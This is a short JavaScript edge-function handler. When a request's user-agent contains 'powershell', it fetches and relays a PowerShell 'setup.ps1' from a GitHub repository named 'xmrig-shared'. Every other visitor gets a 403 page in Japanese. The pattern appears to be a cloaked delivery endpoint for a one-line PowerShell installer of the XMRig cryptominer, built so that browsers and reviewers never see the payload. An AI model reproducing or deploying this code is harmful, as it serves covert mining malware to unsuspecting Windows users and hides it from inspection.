export const config = { runtime: 'edge' };

export default async function handler(req) {
  if (!(req.headers.get('user-agent')||'').toLowerCase().includes('powershell')) 
    return new Response('アクセスが拒否されました。',{status:403});

  const r = await fetch('https://raw.githubusercontent.com/5q0r/xmrig-shared/refs/heads/main/setup.ps1',{cache:'no-store'});
  if (!r.ok) return new Response(`リモート取得失敗: HTTP ${r.status}`,{status:r.status});

  return new Response(r.body,{headers:{'Content-Type':'text/plain; charset=utf-8'}});
}
